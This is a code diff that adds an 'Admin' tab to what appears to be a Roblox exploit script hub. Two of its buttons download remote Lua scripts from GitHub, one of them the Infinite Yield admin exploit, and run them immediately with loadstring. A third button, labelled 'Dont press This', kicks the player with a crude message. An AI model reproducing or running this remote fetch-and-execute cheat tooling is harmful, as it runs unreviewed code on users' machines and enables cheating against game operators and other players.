@@ -396,6 +396,17 @@ while _G.wep do wait()
 end
     end
 end)
+local Tab = Window:NewTab("Admin")
+local Section = Tab:NewSection("FE Admin")
+Section:NewButton("Admin1", "ButtonInfo", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+Section:NewButton("Admin2", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/punpunx/Adri/main/Uri", true))()
+end)
+Section:NewButton("Dont press This", "ButtonInfo", function()
+    game.Players.LocalPlayer:Kick("You has Fucked By Uri")
+end)
 
 
 
